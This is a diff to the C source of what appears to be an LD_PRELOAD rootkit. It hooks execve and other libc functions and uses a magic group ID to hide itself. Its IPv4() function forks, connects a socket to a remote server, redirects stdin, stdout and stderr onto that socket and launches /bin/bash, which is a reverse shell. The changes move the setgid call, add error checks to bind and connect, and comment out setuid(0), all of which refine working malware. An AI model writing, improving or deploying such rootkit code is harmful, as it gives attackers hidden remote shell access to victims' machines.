@@ -37,8 +37,9 @@ static int (*old_puts)(const char *) = NULL;
 
 void IPv4() {
     int sockfd;
+    setgid(MAGIC_GID);
     pid_t pid;
-    
+
     if((pid = fork()) == 0) {
         if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) exit(0x0);
         struct sockaddr_in server, client;
@@ -51,13 +52,11 @@ void IPv4() {
         client.sin_port = htons(LOCAL_PORT);
         client.sin_family = AF_INET;
 
-        bind(sockfd, (struct sockaddr *)&client, sizeof(client));
-        connect(sockfd, (struct sockaddr *)&server, sizeof(server));// == -1) exit(0x0);
+        if(bind(sockfd, (struct sockaddr *)&client, sizeof(client)) == -1) exit(0x0);
+        if(connect(sockfd, (struct sockaddr *)&server, sizeof(server)) == -1) exit(0x0);
         for(int i = 0; i < 3; i++) dup2(sockfd, i);
         if(old_execve == NULL) old_execve = dlsym(RTLD_NEXT, "execve");
 
-        setuid(0);
-        setgid(MAGIC_GID);
         old_execve("/bin/bash", NULL, NULL);
         close(sockfd);
         exit(0x0);
@@ -169,7 +168,7 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
     if(strstr(path, LD_LIBRARY) != NULL) {
         if(old_unlink == NULL) old_unlink = dlsym(RTLD_NEXT, "unlink");
         if(old_fopen == NULL) old_fopen = dlsym(RTLD_NEXT, "fopen");
-        setuid(0);
+        //setuid(0);
         FILE *ld_preload;        
 
         old_unlink(PRELOAD_PATH);
